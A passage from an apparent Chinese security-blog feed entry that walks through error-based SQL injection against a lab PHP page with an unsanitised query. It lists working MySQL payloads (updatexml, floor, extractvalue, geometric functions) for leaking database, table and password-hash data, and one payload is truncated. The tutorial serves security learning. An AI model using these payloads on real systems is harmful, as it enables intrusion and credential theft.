class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment"># get传入id 字符串型</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="comment"># mysqli_error 函数返回错误信息</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h3><p>​在输入框输入报错的sql拼接语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and info()-- </span><br></pre></td></tr></table></figure><p>它的原理是下面一条语句会执行但是会报错，在报错信息中会返回数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info()</span><br></pre></td></tr></table></figure><h3 id="报错注入获取敏感信息"><a href="#报错注入获取敏感信息" class="headerlink" title="报错注入获取敏感信息"></a>报错注入获取敏感信息</h3><p>​通过构造sql语句，返回带有数据库敏感信息的错误信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- </span><br></pre></td></tr></table></figure><p>注意：这里为什么要用<code>updatexml()</code>呢，首先要先了解这个函数</p><blockquote><p>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p></blockquote><p>简单点说，这个函数有三个参数，我们利用第二个参数必须要更改信息的xpath语句来进行报错注入。</p><p>为什么要在第二个参数里面加上concat语句呢？因为updatexml（）第二个参数需要进行xpath校验，如果第二个参数哪里不是xpath语句它会进行一次校验然后把校验后的<code>错误信息返回</code></p><blockquote><p>但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32</p><p>字符就要采用字符串截取方法。每次获取 32 个字符串的长度。</p><p>除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);</span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure></blockquote><h3 id="在黑盒模式下进行报错注入"><a href="#在黑盒模式下进行报错注入" class="headerlink" title="在黑盒模式下进行报错注入"></a>在黑盒模式下进行报错注入</h3><p>​流程还是根之前一样 库名-》表名-》字段-》字段内容</p><h4 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- </span><br></pre></td></tr></table></figure><h4 id="获取表名-这次用floor报错，floor报错不会出现长度问题"><a href="#获取表名-这次用floor报错，floor报错不会出现长度问题" class="headerlink" title="获取表名 这次用floor报错，floor报错不会出现长度问题"></a>获取表名 这次用floor报错，floor报错不会出现长度问题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- </span><br></pre></td></tr></table></figure><p>获取表名为 guestbook 将limit 0,1 改成 1，1是获取第二个表users</p><h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><p>获取users第一个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select 1 from(select count(*),,))</span><br></pre></td></tr></table></figure><p> 获取账号密码</p><p>获取账号和密码需要root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select authentication_string from mysql.user limit 1;</span><br><span class="line">select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))</span><br><span class="line">select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232408409-1564081412.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网安" scheme="https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"/>
    
  </entry>
  
</feed>
